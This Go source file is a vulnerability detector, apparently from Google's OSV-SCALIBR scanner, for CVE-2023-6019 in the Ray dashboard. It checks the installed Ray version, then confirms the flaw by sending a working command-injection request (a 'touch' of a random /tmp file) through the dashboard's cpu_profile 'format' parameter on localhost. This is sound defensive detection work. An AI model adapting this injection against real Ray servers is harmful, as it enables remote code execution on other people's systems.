// Copyright 2025 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

// Package cve20236019 implements a SCALIBR Detector for CVE-2023-6019
// To test, install a vulnerable Ray version: python3 -m pip install ray==2.6.3
// Start the Ray dashboard: python3 -c "import ray; context = ray.init(); print(context)"
// Run the detector
package cve20236019

import (
	"bufio"
	"context"
	"fmt"
	"io/fs"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/google/osv-scalibr/detector"
	"github.com/google/osv-scalibr/extractor"
	"github.com/google/osv-scalibr/extractor/filesystem/language/python/wheelegg"
	scalibrfs "github.com/google/osv-scalibr/fs"
	"github.com/google/osv-scalibr/inventory"
	"github.com/google/osv-scalibr/log"
	"github.com/google/osv-scalibr/packageindex"
	"github.com/google/osv-scalibr/plugin"
	"github.com/ossf/osv-schema/bindings/go/osvschema"
)

const (
	// Name of the detector.
	Name = "cve/cve-2023-6019"
)

// Detector is a SCALIBR Detector for CVE-2023-6019
type Detector struct{}

// New returns a detector.
func New() detector.Detector {
	return &Detector{}
}

// Name of the detector
func (Detector) Name() string { return Name }

// Version of the detector
func (Detector) Version() int { return 0 }

// Requirements of the detector
func (Detector) Requirements() *plugin.Capabilities {
	return &plugin.Capabilities{OS: plugin.OSLinux, DirectFS: true, RunningSystem: true}
}

// RequiredExtractors returns the list of OS package extractors needed to detect
// the presence of the Ray package
func (Detector) RequiredExtractors() []string {
	return []string{wheelegg.Name}
}

// DetectedFinding returns generic vulnerability information about what is detected.
func (d Detector) DetectedFinding() inventory.Finding {
	return d.findingForPackage(nil)
}

func (Detector) findingForPackage(dbSpecific map[string]any) inventory.Finding {
	pkg := &extractor.Package{
		Name:     "ray",
		PURLType: "pypi",
	}
	return inventory.Finding{PackageVulns: []*inventory.PackageVuln{{
		Vulnerability: osvschema.Vulnerability{
			ID:      "CVE-2023-6019",
			Summary: "CVE-2023-6019: Ray Dashboard Remote Code Execution",
			Details: "CVE-2023-6019: Ray Dashboard Remote Code Execution",
			Affected: inventory.PackageToAffected(pkg, "2.8.1", &osvschema.Severity{
				Type:  osvschema.SeverityCVSSV3,
				Score: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
			}),
			DatabaseSpecific: dbSpecific,
		},
	}}}
}

// Scan scans for the vulnerability
func (d Detector) Scan(ctx context.Context, scanRoot *scalibrfs.ScanRoot, px *packageindex.PackageIndex) (inventory.Finding, error) {
	rayVersion, pkg := findRayPackage(px)
	if rayVersion == "" {
		log.Debugf("No Ray version found")
		return inventory.Finding{}, nil
	}
	log.Infof("Ray version found")

	// Check if Ray version is vulnerable (< 2.8.1)
	if !isVulnerableVersion(rayVersion) {
		log.Infof("Ray version %q is not vulnerable", rayVersion)
		return inventory.Finding{}, nil
	}
	log.Infof("Found potentially vulnerable Ray version %v", rayVersion)

	// Check for the "Ray Dashboard" string in the HTTP response
	if !isDashboardPresent(ctx) {
		log.Infof("Ray Dashboard not found in HTTP response")
		return inventory.Finding{}, nil
	}
	// Attempt the curl request
	filepath := attemptExploit(ctx)
	if fileExists(scanRoot.FS, filepath) {
		log.Infof("Vulnerability exploited successfully")
	} else {
		log.Infof("Exploit attempt failed")
		return inventory.Finding{}, nil
	}

	dbSpecific := map[string]any{
		"extra": fmt.Sprintf("%s %s %s", pkg.Name, pkg.Version, strings.Join(pkg.Locations, ", ")),
	}
	return d.findingForPackage(dbSpecific), nil
}

// Find the Ray package and its version
func findRayPackage(px *packageindex.PackageIndex) (string, *extractor.Package) {
	pkg := px.GetSpecific("ray", "pypi")
	for _, p := range pkg {
		return p.Version, p
	}
	return "", nil
}

// Check if the Ray version is vulnerable
func isVulnerableVersion(version string) bool {
	// Split the version string into major, minor, and patch components
	parts := strings.Split(version, ".")
	if len(parts) < 2 {
		log.Errorf("Invalid Ray version format: %s", version)
		return false // Consider this not vulnerable to avoid false positives
	}
	// Parse the major and minor version components
	major, err := strconv.Atoi(parts[0])
	if err != nil {
		log.Errorf("Error parsing major version: %v", err)
		return false
	}
	minor, err := strconv.Atoi(parts[1])
	if err != nil {
		log.Errorf("Error parsing minor version: %v", err)
		return false
	}
	// Check if the version is less than 2.8.1
	return major < 2 || (major == 2 && minor < 8)
}

// Check for "Ray Dashboard" in HTTP response
func isDashboardPresent(ctx context.Context) bool {
	// Create a new HTTP request
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, "http://127.0.0.1:8265", nil)
	if err != nil {
		log.Errorf("Error creating HTTP request: %v", err)
		return false
	}

	// Create an HTTP client and send the request
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		log.Errorf("Error making HTTP request: %v", err)
		return false
	}
	defer resp.Body.Close()

	// Read the response body and check for "Ray Dashboard"
	scanner := bufio.NewScanner(resp.Body)
	for scanner.Scan() {
		if strings.Contains(scanner.Text(), "Ray Dashboard") {
			log.Infof("Ray Dashboard found in HTTP response")
			return true
		}
	}
	if err := scanner.Err(); err != nil {
		log.Errorf("Error reading HTTP response: %v", err)
	}
	return false
}

// attemptExploit attempts to exploit the vulnerability by touching a random file via HTTP query
func attemptExploit(ctx context.Context) string {
	// Generate a random file path
	randomFilePath := "/tmp/" + generateRandomString(16)

	// Format the command for the query
	testCmd := "touch%%20" + randomFilePath
	// Perform the HTTP query
	statusCode := rayRequest(ctx, "127.0.0.1", 8265, testCmd)
	log.Infof("HTTP request returned status code: %d", statusCode)
	return randomFilePath
}

// rayRequest sends an HTTP GET request to the Ray Dashboard and executes the provided command
func rayRequest(ctx context.Context, host string, port int, cmd string) int {
	url := fmt.Sprintf("http://%s/worker/cpu_profile?pid=3354&ip=127.0.0.1&duration=5&native=0&format=%s", net.JoinHostPort(host, strconv.Itoa(port)), cmd)

	// Create a new HTTP request
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		log.Errorf("Error creating HTTP request: %v", err)
		return 500 // Return an error code
	}

	// Create an HTTP client and send the request
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		log.Infof("Error when sending request %s to the server", url)
		return 500 // Return an error code
	}
	defer resp.Body.Close()

	// Return the HTTP status code
	return resp.StatusCode
}

func fileExists(filesys scalibrfs.FS, path string) bool {
	_, err := fs.Stat(filesys, path)
	return !os.IsNotExist(err)
}

// Generate a random string of the given length
func generateRandomString(length int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	bytes := make([]byte, length)
	for i := range length {
		bytes[i] = letters[rand.Intn(len(letters))]
	}
	return string(bytes)
}
